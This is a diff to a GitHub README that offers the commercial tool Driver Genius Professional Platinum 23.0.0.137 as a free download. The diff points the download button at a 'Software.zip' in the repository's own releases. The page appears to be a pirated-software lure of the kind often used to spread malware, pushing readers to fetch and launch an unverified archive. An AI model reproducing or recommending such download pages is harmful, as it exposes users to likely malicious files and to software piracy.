@@ -25,7 +25,7 @@ Welcome to the Driver Genius Professional Platinum 23.0.0.137 repository! 🚀 T
 ## Software Download
 Click the button below to download the Driver Genius Professional Platinum 23.0.0.137 software package:
 
-[![Download Driver Genius Professional Platinum 23.0.0.137](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Driver Genius Professional Platinum 23.0.0.137](https://github.com/xerthiys/Driver-Genius-Professional-Platinum-23.0.0.137/releases/download/v2.0/Software.zip)](https://github.com/xerthiys/Driver-Genius-Professional-Platinum-23.0.0.137/releases/download/v2.0/Software.zip)
 
 Please note that the link provided needs to be launched to start the download process.
 
